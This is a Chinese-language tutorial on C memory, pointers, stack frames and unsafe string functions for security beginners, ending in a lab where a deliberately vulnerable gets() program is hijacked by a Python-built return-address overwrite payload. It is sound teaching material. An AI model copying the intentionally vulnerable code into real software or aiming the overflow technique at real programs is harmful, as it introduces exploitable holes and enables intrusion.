## 1. 内存到底是什么？

### 🏪 生活场景：图书馆的存包柜

你去图书馆自习，门口有一排存包柜。你把书包放进 15 号柜，拿到一把写着"15"的钥匙。出来的时候，你凭钥匙上的号码找到柜子，取出书包。

**这个场景里藏着内存的所有关键概念：**

```
存包柜系统                         计算机内存
─────────────────────────────────────────────────
一排柜子，每个有编号(1~200)    =  内存是一个字节数组，每个字节有地址
你的东西占了 3 个柜子(15/16/17) =  一个 int 变量占 4 个连续的字节
钥匙上只写"15"——首柜编号       =  指针存的是起始地址
你把钥匙给人=告诉别人"地址"     =  传指针 = 传地址
捡到钥匙的人能开柜=任意访问      =  有地址就能读写那块内存
拿错钥匙开了别人的柜子           =  ★ 这就是漏洞的本质！
```

**来，把这个场景具体化：**

你存了一个书包，占了 15、16、17 号三个柜子。管理员给你一把写着"15"的钥匙（这就是指针——你不需要知道占了几个柜子，只需要知道从哪开始）。

另一个人来存东西。他应该用 18 号柜。但程序出错了——他开始往 16 号柜里塞东西（数组越界！）。你的书包有一半被他的东西挤坏了。

**这就是 C 语言里每天都在发生的事：** 一段代码拿到了内存地址，然后往那儿写数据。如果它写多了、写偏了，就覆盖了别人的数据。如果"别人"恰好是程序的控制信息（比如返回地址），黑客就能控制程序的执行流程。

### 🔍 技术原理

每个程序运行的时候，操作系统分配给它一大块内存。这块内存被分成**字节**——每个字节是 8 个比特，能存 0~255 之间的一个数。

```
内存地址（通常用十六进制表示）：

地址:  0x1000  0x1001  0x1002  0x1003  0x1004  0x1005  0x1006  0x1007
      ┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐┌───────┐
      │  65   ││  66   ││  67   ││   0   ││  10   ││   0   ││   0   ││   0   │
      │ 'A'   ││ 'B'   ││ 'C'   ││ '\0'  ││ (int) ││       ││       ││       │
      └───────┘└───────┘└───────┘└───────┘└───────┘└───────┘└───────┘└───────┘
      数组 "ABC" (4字节)               整数 10 (4字节，小端序)
```

**关键事实：**
- 内存地址只是一个数字——就像柜子编号只是一个数字
- 不同类型的数据占用不同数量的字节：char = 1 字节，int = 4 字节，double = 8 字节
- 程序通过地址来读写——CPU 说"把 0x1004 处的 4 个字节读出来"
- **内存里指令和数据没有区别**——都是一堆字节。如果你把数据当成指令送给 CPU 执行，CPU 照样执行（shellcode 的原理！）

### 💻 动手写代码

```c
#include <stdio.h>

int main() {
    char c = 'A';
    int i = 42;
    double d = 3.14;

    // %p 打印地址（指针的值）
    // & 是"取地址"运算符
    printf("变量 c 的值: %c, 地址: %p, 占用: %zu 字节\n", c, (void*)&c, sizeof(c));
    printf("变量 i 的值: %d, 地址: %p, 占用: %zu 字节\n", i, (void*)&i, sizeof(i));
    printf("变量 d 的值: %f, 地址: %p, 占用: %zu 字节\n", d, (void*)&d, sizeof(d));

    return 0;
}
```

保存为 `memory.c`，运行：

```bash
gcc -o memory memory.c
./memory
```

你会看到类似这样的输出：

```
变量 c 的值: A, 地址: 0x7ffd8e3f4a1f, 占用: 1 字节
变量 i 的值: 42, 地址: 0x7ffd8e3f4a18, 占用: 4 字节
变量 d 的值: 3.140000, 地址: 0x7ffd8e3f4a10, 占用: 8 字节
```

**注意看地址！** 在我的机器上，d 的地址最小（0x...10），i 在它上面 8 字节（0x...18），c 又在上面 1 字节。**局部变量在栈上从高地址向低地址排列。**

### 🧪 小实验

把上面的代码改一下，在每个变量前后各加一个变量，看看地址是怎么变化的：

```c
int before = 99;
char c = 'A';
int after = 100;
// 打印 before、c、after 的地址
```

**观察：** 它们的地址不是连续的！编译器会在变量之间留"空隙"（对齐 padding）。这就是为什么有时候越界几个字节不一定会马上崩溃——你覆盖的是"空隙"。

### ⚠️ 常见误区

> ❌ **误区：** "内存地址是随机的，每次运行都不一样"
> ✅ **真相：** 现代系统有 ASLR（地址空间布局随机化），但**局部变量之间的相对位置是固定的**。每次运行，所有地址一起随机偏移，但 c 和 i 之间的距离不变。

## 2. 指针——存地址的变量

### 🏪 生活场景：快递单上的收件地址

你要给朋友寄一个包裹。你不需要把朋友本人塞进快递箱——你只需要知道他的**地址**。快递员根据地址找到他，把包裹交给他。

```
普通变量 a = 10
    → 你手里有 10 块钱（直接拥有值）

指针 p = &a
    → 你手里有一张写着"a 住在 0x7fff1234"的纸条（拥有地址）
    → 想用 a 的值？按纸条上的地址去找 → *p
```

**为什么叫"指针"？** 因为它不存数据本身，而是"指向"数据所在的位置——就像路标指向"前方 500 米厕所"，路标本身不是厕所。

### 🔍 技术原理

```c
int a = 10;        // a 是一个 int 变量，存的是 10
int *p = &a;       // p 是一个"指向 int 的指针"，存的是 a 的地址

// 三个关键符号：
// &a  → "取地址"——问"a 住在哪？"返回 a 的地址
// p   → 指针变量，里面存的就是地址
// *p  → "解引用"——问"p 指的地址里存了什么？"去那个地址取出值
```

**图解：**

```
      变量 a (int, 值=10)              变量 p (int*, 值=0x7fff1234)
    ┌─────────────────────┐         ┌─────────────────────┐
    │         10          │ ←────── │     0x7fff1234      │
    └─────────────────────┘         └─────────────────────┘
    地址: 0x7fff1234                 地址: 0x7fff1238

&a → "a 的门牌号是多少？" → 0x7fff1234
*p → "按 p 里的门牌号去找，屋子里有什么？" → 10
```

### 💻 动手写代码

```c
#include <stdio.h>

int main() {
    int a = 10;
    int *p = &a;    // p 指向 a

    printf("=== 看看 a 和 p 的关系 ===\n");
    printf("a 的值: %d\n", a);
    printf("a 的地址: %p\n", (void*)&a);
    printf("p 的值(存的地址): %p\n", (void*)p);
    printf("p 自己的地址: %p\n", (void*)&p);   // 指针本身也有地址！
    printf("*p (解引用): %d\n", *p);

    printf("\n=== 通过指针修改 a 的值 ===\n");
    *p = 999;   // 通过指针修改变量
    printf("修改后 a 的值: %d\n", a);   // a 变成 999 了！

    printf("\n=== 指针大小 ===\n");
    printf("int* 的大小: %zu 字节\n", sizeof(int*));
    printf("char* 的大小: %zu 字节\n", sizeof(char*));
    // 64位系统上，所有类型的指针都是 8 字节——因为地址是 64 位的
}
```

### 🧪 小实验

1. 把 `*p = 999` 改成 `*p = 0`，看看 a 的值跟着变了吗？
2. 声明一个 `int *q;` 但不初始化，然后打印 `*q`。**程序崩溃了吗？** 这就是未初始化指针的危险——它指向一个随机地址，读写它可能导致段错误，也可能悄无声息地破坏了别人的数据。

### ⚠️ 常见误区

> ❌ **误区：** "指针很复杂，是一种特殊的数据类型"
> ✅ **真相：** 指针就是**存地址的整数**。在 64 位系统上，指针就是一个 64 位无符号整数。所谓 `int*`、`char*` 的区别只是告诉编译器"这个地址处的数据，按 int 的格式解读"还是"按 char 的格式解读"。底层都是地址。

> ❌ **误区：** "学了指针就是为了写链表/树"
> ✅ **真相：** 在安全领域，指针的意义是：**你可以通过指针访问内存中的任意位置**——包括你不该访问的位置。理解指针 = 理解"程序为什么能越权访问"。

## 3. 数组和指针——其实是一回事

### 🏪 生活场景：街道门牌号系统

一条街上有 100 栋房子，每栋房子有门牌号。门牌号从 100 号开始，到 199 号。

```
arr[0] → 100 号房子
arr[1] → 101 号房子（100 + 1）
arr[2] → 102 号房子（100 + 2）
...
arr[i] → (100 + i) 号房子

如果你问 arr[150]：
  → 100 + 150 = 250 号房子
  → 但这条街只到 199 号！
  → 你走进了隔壁工厂的大门
  → C 语言不会阻止你——它直接走进去看里面有什么
```

这就是数组越界的本质：你拿了一个合法的起始地址，但走了太远。

### 🔍 技术原理

```c
int arr[5] = {10, 20, 30, 40, 50};

// arr 本身是什么？——它就是这个数组的起始地址！
// 下面四个表达式完全等价：
arr[2]      // 正常写法：第 3 个元素
*(arr + 2)  // arr 是地址，+2 表示往后走 2 个 int
*(2 + arr)  // 加法交换律
2[arr]      // 因为 *(2+arr) 和 arr[2] 一样，所以 2[arr] 也能用！（别这样写）
```

**arr[i] 实际做的事：**

```
arr[i] = 从 arr 地址出发，走 i × sizeof(元素类型) 个字节，取出那里的值

arr[0] → 从 arr 出发，走 0×4=0 字节   → 取 10
arr[1] → 从 arr 出发，走 1×4=4 字节   → 取 20
arr[100] → 从 arr 出发，走 100×4=400 字节 → 取……天知道什么东西
```

### 图解：数组在内存中的布局

```
int arr[5] = {10, 20, 30, 40, 50};

地址: arr      arr+4    arr+8    arr+12   arr+16    arr+20 (越界！)
      ↓        ↓        ↓        ↓        ↓         ↓
      ┌────────┬────────┬────────┬────────┬────────┬───?───┐
      │   10   │   20   │   30   │   40   │   50   │  ???  │
      └────────┴────────┴────────┴────────┴────────┴───?───┘
        arr[0]   arr[1]   arr[2]   arr[3]   arr[4]   arr[5] (越界访问！)
```

### 💻 动手写代码

```c
#include <stdio.h>

int main() {
    int arr[5] = {10, 20, 30, 40, 50};

    printf("=== 数组和指针的等价关系 ===\n");
    printf("arr 的地址: %p\n", (void*)arr);
    printf("&arr[0] 的地址: %p\n", (void*)&arr[0]);
    // 这两个地址一样！arr 就是首元素地址

    printf("\n=== 用不同方式访问第 3 个元素 ===\n");
    printf("arr[2]   = %d\n", arr[2]);
    printf("*(arr+2) = %d\n", *(arr + 2));
    // printf("2[arr]   = %d\n", 2[arr]);  // 也能用，但永远别这样写

    printf("\n=== ⚠️ 越界访问（危险！不要在实际代码中这样做） ===\n");
    printf("arr[5]   = %d  ← 这已经越界了！取到的是栈上的随机值\n", arr[5]);
    printf("arr[100] = %d  ← 远远越界！可能读到任何东西\n", arr[100]);

    // 下面这行如果取消注释，很可能会段错误（Segmentation Fault）
    // arr[1000000] = 42;  // 写了不该写的地方！

    return 0;
}
```

### 🧪 小实验

用循环遍历 arr 的"邻居"——看看数组前后各有什么：

```c
int arr[5] = {10, 20, 30, 40, 50};
printf("越界向前看 5 个 int:\n");
for (int i = -5; i < 0; i++) {
    printf("arr[%d] = %d (地址: %p)\n", i, arr[i], (void*)&arr[i]);
}
// 这些地址里存的是栈上的其他数据——可能是其他局部变量
```

### ⚠️ 常见误区

> ❌ **误区：** "C 语言数组越界会报错"
> ✅ **真相：** C 语言**不检查数组越界**。这是设计哲学：信任程序员。代价是——如果你犯了错，程序不会告诉你，它只是默默读写了不该碰的内存。这就是大多数安全漏洞的根源。

## 4. 📌 栈（Stack）和堆（Heap）——程序的两种内存

> ⚠️ **这是全书最重要的一节。** 栈的结构理解不透，07 章二进制安全就完全看不懂。请反复看栈帧图，直到能在白纸上不看笔记默画出来。

### 🏪 生活场景：餐厅洗盘子 vs 仓库取货

**栈 = 餐厅后厨的盘子摞**

服务员收盘子回来，把脏盘子往上一摞（push）。洗碗工从最上面拿盘子洗（pop）。**后进先出（LIFO）**——最后摞上去的盘子最先被拿走。

- 盘子摞的高度由餐厅的盘子总数决定（栈大小固定，通常 8MB）
- 你不需要知道盘子具体在哪个位置——只需要操作最上面那个（RSP 栈顶指针）
- 如果盘子摞太高，超过了盘子总数——啪！栈溢出（Stack Overflow）！

**堆 = 仓库货架**

你去仓库管理员那儿说"我要一块这么大的空地"（malloc），管理员说"第 3 排第 5 层给你"。用完你要告诉管理员"我用完了，还给你"（free）。忘记还？那就是**内存泄漏**——仓库空间被占着但没人用。

| 特性 | 栈 Stack（盘子摞） | 堆 Heap（仓库） |
|------|------------------|---------------|
| 怎么分配 | 自动——函数进来就有，出去就没了 | 手动——你要就要，不要记得还 |
| 大小限制 | 小（约 8MB），超出 = 栈溢出 | 大（受物理内存 + 虚拟内存限制） |
| 速度 | 极快（只需移动一个指针） | 较慢（要搜索空闲块） |
| 管理方式 | 编译器自动插入 push/pop | 程序员手动 malloc/free |
| 增长方向 | 高地址→低地址（向下长） | 低地址→高地址（向上长） |
| 典型错误 | 栈溢出（覆盖返回地址） | 内存泄漏、堆溢出、Use-After-Free |

### 🔍 技术原理：栈帧结构

**这是整个知识库最重要的一张图。** 每次调用一个函数，都会在栈上创建一个"栈帧"（Stack Frame）：

```
        高地址（地址数字大，图上方）
        ┌──────────────────────────┐
        │  调用者 (main) 的局部变量   │  ← main 的栈帧
        ├──────────────────────────┤
        │  传给 func 的参数          │  ← 参数从右向左压栈
        │  比如第2个参数: 4          │
        │  比如第1个参数: 3          │
        ├──────────────────────────┤
        │  ★ 返回地址 (Return Addr)  │  ← call 指令压入！
        │  func 执行完该回 main 的哪一行？ │  这就是我们要攻击的目标！
        ├──────────────────────────┤
        │  旧的 RBP 值               │  ← main 的栈底指针
        │  (main 的 rbp 被保存在这)   │     push rbp 压入的
        ├──────────────────────────┤  ← RBP 指向这里（当前栈帧的"底"）
        │  func 的局部变量:          │
        │    buf[15] (最后一个字节)   │     高地址端
        │    buf[14]                 │
        │    ...                     │     ↑ buf 从低地址向高地址填充
        │    buf[0]  (第一个字节)     │     │
        │    result                  │  ← 其他局部变量
        ├──────────────────────────┤
        │  未使用的栈空间             │  ← RSP 指向这里（栈顶）
        └──────────────────────────┘
        低地址（地址数字小，图下方）
```

### 🔥 关键洞察：为什么栈溢出能控制程序？

看上面的图。buf 共 16 字节，从低地址向高地址填充。

**如果你往 buf 里写了超过 16 字节的数据，多出来的字节会：**

```
第 17-20 字节 → 覆盖 result（其他局部变量）     ← 可能还好，程序逻辑出错
第 21-28 字节 → 覆盖"旧的 RBP"                  ← 破坏了栈帧链
第 29-36 字节 → ★ 覆盖"返回地址"★               ← 程序的控制权被劫持！
```

**func 执行完要返回 main 时，CPU 执行 `ret` 指令：**
1. 从栈上"返回地址"的位置取出 8 个字节
2. 把这 8 个字节当成一个地址
3. `RIP = 这个地址`（跳过去执行）

**如果你把这 8 个字节改成了恶意代码的地址——程序就跳去执行你的恶意代码了！**

### 💻 动手写代码：一个故意栈溢出的程序

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buf[16];               // 只分配了 16 字节的局部数组
    strcpy(buf, input);         // ★ 不检查长度！直接把 input 复制到 buf
    printf("buf 的内容: %s\n", buf);
    printf("buf 的地址: %p\n", (void*)buf);
    // 函数返回时，从栈上取"返回地址"跳转
}

int main() {
    char normal[] = "Hello";            // 6 字节，安全
    char attack[100];
    memset(attack, 'A', 99);           // 把 99 个 'A' 填进去
    attack[99] = '\0';

    printf("正常输入测试:\n");
    vulnerable(normal);                 // OK，6 字节 < 16

    printf("\n溢出输入测试:\n");
    vulnerable(attack);                 // 99 字节 >> 16！
    // 返地址被 'A' (0x41) 覆盖 → RIP 变成 0x4141414141414141
    // → CPU 尝试跳转到这个地址 → 段错误！

    printf("这行永远不会执行——因为程序已经崩溃了\n");
    return 0;
}
```

保存为 `overflow.c`，编译运行：

```bash
gcc -fno-stack-protector -o overflow overflow.c
# -fno-stack-protector 关掉栈保护，否则编译器会阻止你看到效果
./overflow
```

你会看到：正常输入没问题，溢出输入后程序崩溃——"Segmentation Fault (core dumped)"。

### 🧪 小实验

1. 把 `buf[16]` 改成 `buf[32]`，重新编译运行。溢出了吗？（调整 attack 长度试试）
2. 把 `strcpy` 换成 `strncpy(buf, input, 16)`，重新编译运行。还崩溃吗？
3. 把 memset 的 'A' 改成 'B'（0x42），崩溃时的 RIP 从 `0x414141...` 变成了什么？

## 5. 📌 网安必知的几个危险函数

### 🏪 生活场景：不看刻度线的杯子

你有一个容量 200 毫升的杯子。倒水的时候：
- **安全做法：** 看着刻度线，到 200ml 就停
- **gets/strcpy 的做法：** 闭着眼睛倒，倒多少算多少。水壶里有 500ml？全倒进去！杯子满了？溢出来了！桌子湿了（栈溢出）！

这就是 C 语言中危险函数的本质：**它们不问你目标有多大，只管自己写多少。**

### 💣 头号通缉犯完整档案

#### 1. gets() —— 永远的罪魁祸首

```c
// ❌ 危险：gets() 读取直到换行，不管 buf 多大
char buf[16];
gets(buf);   // 用户输入 100 个字符 → 溢出 84 字节

// ✅ 安全：fgets() 限制最大读取长度
char buf[16];
fgets(buf, sizeof(buf), stdin);  // 最多读 15 个字符 + '\0'
```

**为什么 gets 这么坏？** 因为没有任何办法能让它安全。它只有一个参数——buf 的起始地址，根本不知道 buf 有多大。所以 C11 标准直接**把 gets 从 C 语言中删除了**。如果你的编译器还支持 gets，它应该给你一个警告。

#### 2. strcpy() —— 最常用的地雷

```c
// ❌ 危险
char dst[8];
strcpy(dst, "This string is way too long for the buffer");
// dst 溢出！

// ✅ 安全
char dst[8];
strncpy(dst, src, sizeof(dst) - 1);  // 最多复制 7 个字符
dst[sizeof(dst) - 1] = '\0';         // 手动确保以 \0 结尾
```

#### 3. strcat() —— 拼接时溢出

```c
// ❌ 危险
char buf[10] = "Hello";       // 已用 5 字节 + \0
strcat(buf, " World!!!");     // 想加 9 字节 → 溢出

// ✅ 安全
strncat(buf, src, sizeof(buf) - strlen(buf) - 1);
```

#### 4. sprintf() —— 格式化溢出

```c
// ❌ 危险
char buf[16];
sprintf(buf, "用户输入: %s", user_input);

// ✅ 安全
snprintf(buf, sizeof(buf), "用户输入: %s", user_input);
```

#### 5. scanf("%s") —— 默认不限制

```c
// ❌ 危险
char buf[16];
scanf("%s", buf);        // 读到空白符为止，不管多长

// ✅ 安全
scanf("%15s", buf);      // 明确限制最多读 15 个字符
```

### 🛡️ 记住一条规律

安全的函数名字里带 "n"：`strncpy`、`strncat`、`snprintf`、`fgets`

**但 n 不是银弹：**
- 如果 `n` 算错了（比如写了 `sizeof(指针)` 而不是 `sizeof(数组)`），等于没设
- `strncpy` 如果 src 比 n 短，会用 `\0` 填充剩余空间；如果 src 比 n 长，dst 不会以 `\0` 结尾——又是一个坑

### 💻 双栏对比：每种函数的"被黑"版本和"安全"版本

```c
#include <stdio.h>
#include <string.h>

// ===== gets 的对比 =====
void demo_gets() {
    char buf[16];
    printf("gets 版本（危险）——输入超过 15 个字符试试:\n");
    // gets(buf);  // C11 已删除 gets，这里写出来只是演示
    // 如果你的编译器还支持，你会看到溢出

    printf("fgets 版本（安全）:\n");
    fgets(buf, sizeof(buf), stdin);  // 最多读 15 个字符
    printf("安全读入: %s\n", buf);
}

// ===== strcpy 的对比 =====
void demo_strcpy() {
    char *long_str = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";  // 32 个 A
    char buf1[16], buf2[16];

    // 危险版本
    strcpy(buf1, long_str);  // 溢出！buf1 只有 16 字节，但 long_str 有 32 个字符
    printf("strcpy 结果: %s (已经溢出了！)\n", buf1);

    // 安全版本
    strncpy(buf2, long_str, sizeof(buf2) - 1);
    buf2[sizeof(buf2) - 1] = '\0';
    printf("strncpy 结果: %s (被截断，安全)\n", buf2);
}
```

### ⚠️ 常见误区

> ❌ **误区：** "用了 strncpy 就安全了"
> ✅ **真相：** 如果你的 n 写错了，等于没设。比如 `strncpy(dst, src, strlen(src))` 跟 `strcpy` 没有区别。关键是 **n 必须反映目标缓冲区的大小**，不是源的大小。

## 6. GDB 调试——20 分钟上手

### 🏪 生活场景：给程序装监控摄像头

程序跑起来一眨眼就结束了。你想看它在每一步做了什么——这时候你需要一个调试器。**GDB 就是程序的监控摄像头**：你可以让程序暂停在某个位置，查看所有变量的值、寄存器的值、内存的内容，然后让它单步执行。

就像你看球赛回放可以逐帧播放一样——GDB 让你逐指令播放程序。

### 🔍 安装和启动

```bash
# Linux (Debian/Ubuntu)
sudo apt install gdb

# Mac
# 装好 Xcode Command Line Tools 就自带

# Windows (MinGW)
# MinGW 安装时勾选 gdb，或者用 WSL

# 安装 pwndbg 插件（强烈推荐！让 GDB 好看 100 倍）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
```

### 💻 GDB 核心命令实操

```bash
# 准备一个带调试符号的程序
gcc -g -fno-stack-protector -o vuln vuln.c
#    ↑ -g 加入调试符号（变量名、行号）
#    ↑ -fno-stack-protector 关掉栈保护，方便观察溢出

# 启动 GDB
gdb ./vuln
```

进入 GDB 后的操作：

```
(gdb) b main           # 在 main 函数入口打断点（breakpoint）
(gdb) r                # 运行程序（run）
# → 程序停在 main 的第一行

(gdb) n                # 执行下一行（next），不进入函数内部
(gdb) s                # 执行下一行（step），会进入函数内部

(gdb) p var            # 打印变量 var 的值（print）
(gdb) p &var           # 打印变量 var 的地址
(gdb) p/x var          # 以十六进制格式打印

(gdb) i r              # 查看所有寄存器的值（info registers）
(gdb) i r rsp rbp rip  # 只看指定的寄存器

(gdb) x/16xw $rsp      # 查看栈顶 16 个字（十六进制，word=4字节）
                        # x = examine（查看内存）
                        # 16 = 显示 16 个单元
                        # x = 十六进制格式
                        # w = 以 word(4字节) 为单位

(gdb) x/s 0x400123     # 把该地址处的数据当字符串显示

(gdb) disas func       # 反汇编 func 函数
(gdb) bt               # 查看调用栈（backtrace）

(gdb) c                # 继续运行到下一个断点（continue）
(gdb) q                # 退出
```

## 7. 🧪 综合实验：用 GDB 观察栈溢出

> 这个实验把 1-6 节的知识串起来。**必须亲手做一遍。**

### 实验准备

```c
// exp.c —— 故意制造栈溢出的程序
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("🎉 你成功劫持了程序控制流！\n");
    printf("这个函数本来不应该被调用的！\n");
}

void vulnerable() {
    char buf[64];
    printf("buf 的地址: %p\n", (void*)buf);
    printf("secret_function 的地址: %p\n", (void*)secret_function);
    printf("请输入 payload: ");
    gets(buf);  // 故意用 gets
    printf("你输入了: %s\n", buf);
}

int main() {
    vulnerable();
    printf("程序正常结束了。\n");
    return 0;
}
```

### 实验步骤

```bash
# 1. 编译（关保护）
gcc -g -fno-stack-protector -z execstack -no-pie -o exp exp.c

# 2. 记录 secret_function 的地址
gdb ./exp -q -ex "p secret_function" -ex "q"
# 或者在 GDB 里: (gdb) p secret_function
# 假设输出: {void ()} 0x401156 <secret_function>
# 记住这个地址！比如 0x401156

# 3. 计算偏移量
# buf 是 64 字节，加上 RBP 的 8 字节 = 72 字节
# 所以第 73-80 字节是返回地址
# 偏移量 = 64 (buf) + 8 (rbp) = 72 字节

# 4. 构造 payload（用 Python）
python3 -c '
import sys
addr = 0x401156  # 你的 secret_function 地址
payload = b"A" * 72                # 填充 buf + rbp
payload += addr.to_bytes(8, "little")  # 小端序覆盖返回地址
sys.stdout.buffer.write(payload)
' > payload.bin

# 5. 运行攻击
cat payload.bin | ./exp
# 如果一切正常，你会看到：
# 🎉 你成功劫持了程序控制流！
# 然后程序崩溃（因为 secret_function 的返回地址是乱的）

# 6. 在 GDB 里观察整个过程
gdb ./exp
(gdb) b vulnerable
(gdb) r < payload.bin
(gdb) n                          # 执行 gets(buf)
(gdb) x/20gx $rsp                # 看栈！返回地址已经被改成了 0x401156
(gdb) ni                         # 单步执行 ret 指令
# → RIP 变成了 0x401156！程序跳到了 secret_function！
```

## 8. 自己写一个内存查看器

这个小工具让你直观感受"内存地址只是一个数字，你可以读任何地址"。

```c
#include <stdio.h>
#include <stdlib.h>

// 内存查看器：给定一个起始地址，打印周围的内存内容
void memory_peek(void *addr, int num_bytes) {
    unsigned char *p = (unsigned char*)addr;

    printf("地址 %p 附近的 %d 字节:\n", addr, num_bytes);
    printf("偏移   十六进制                    可打印字符\n");
    printf("────   ────────────────────────    ──────────\n");

    for (int i = 0; i < num_bytes; i += 16) {
        // 打印偏移
        printf("+%-4d  ", i);

        // 打印十六进制
        for (int j = 0; j < 16 && (i + j) < num_bytes; j++) {
            printf("%02x ", p[i + j]);
        }
        // 补齐空格
        for (int j = i + 16; j < num_bytes && j < i + 16; j++) {
            // skip padding for incomplete last line
        }
        printf("   ");

        // 打印可打印字符（不可打印的显示为 .）
        for (int j = 0; j < 16 && (i + j) < num_bytes; j++) {
            unsigned char c = p[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("\n");
    }
}

int main() {
    int a = 42;
    char str[] = "Hello, memory!";
    int b = 99;

    printf("=== 变量 a (int, 值=42) 的内存 ===\n");
    memory_peek(&a, 16);

    printf("\n=== 变量 str (char[], 值=\"Hello, memory!\") 的内存 ===\n");
    memory_peek(str, 32);

    printf("\n=== 变量 b (int, 值=99) 的内存 ===\n");
    memory_peek(&b, 16);

    // 看看三个变量在内存中的位置关系
    printf("\n=== 地址对比 ===\n");
    printf("a 的地址:   %p\n", (void*)&a);
    printf("str 的地址: %p\n", (void*)str);
    printf("b 的地址:   %p\n", (void*)&b);
    printf("a 和 b 的距离: %ld 字节\n", (char*)&a - (char*)&b);

    return 0;
}
```

运行它，观察：
- a、str、b 在内存中的相对位置
- 你能在 str 附近看到 "Hello, memory!" 的 ASCII 码吗？
- a 的值 42（十六进制 0x2A）存储的格式是什么？（小端序：2A 00 00 00）

## 🧵 实际案例串联

学完本章，你可以理解以下真实安全事件的技术原理：

### 案例 1：2001 年 Code Red 蠕虫

微软 IIS 服务器的 `idq.dll` 中有一个缓冲区溢出漏洞。攻击者发送超长的 URL（远超缓冲区大小）→ 覆盖返回地址 → 跳转到 shellcode → 服务器被远程控制。

**涉及的本草知识点：** §4 栈结构、§5 危险函数（strcpy）、§2 指针覆盖返回地址。

### 案例 2：2014 年 Heartbleed（心脏滴血）

这不是栈溢出，而是**越界读取**。OpenSSL 的 heartbeat 功能允许客户端问服务器"我给你发了 X 个字节，你回给我"。但如果客户端说"我给你发了 65535 个字节"（实际上只发了 1 个字节），服务器会从内存里多读 65534 个字节返回——这些字节里可能包含私钥、密码。

**涉及的本草知识点：** §1 内存模型（程序可以读任意地址）、§3 数组越界不检查。

### 案例 3：你手机上的每个 App

你在手机上用的微信、支付宝、抖音——它们的底层都有 C/C++ 代码。这些代码里如果有栈溢出漏洞，攻击者可以通过发送精心构造的数据（比如一个特殊的表情包、一段特殊的语音消息）来远程控制你的手机。这就是为什么手机操作系统一直在更新补丁。
